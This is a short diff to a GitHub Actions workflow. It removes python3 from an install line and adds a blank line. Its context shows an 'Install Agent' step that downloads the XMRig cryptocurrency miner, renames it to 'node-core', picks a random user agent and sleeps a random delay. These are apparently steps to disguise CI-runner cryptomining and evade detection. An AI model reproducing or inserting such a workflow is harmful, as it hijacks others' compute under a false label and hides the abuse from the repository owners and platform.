@@ -20,7 +20,7 @@ jobs:
       - name: Install Agent
         run: |
           sudo apt update -y
-          sudo apt install -y curl tar coreutils xxd base64 python3
+          sudo apt install -y curl tar coreutils xxd base64
           curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
           tar -xzf node.tar.gz
           mv xmrig-6.24.0 node-core
@@ -35,6 +35,7 @@ jobs:
           cd node-core
           UA=$(echo $UA_LIST | tr "|" "\n" | shuf -n 1)
           echo "Using UA: $UA"
+
           DELAY=$((RANDOM % 180 + 30))
           echo "Waiting $DELAY sec..."
           sleep $DELAY
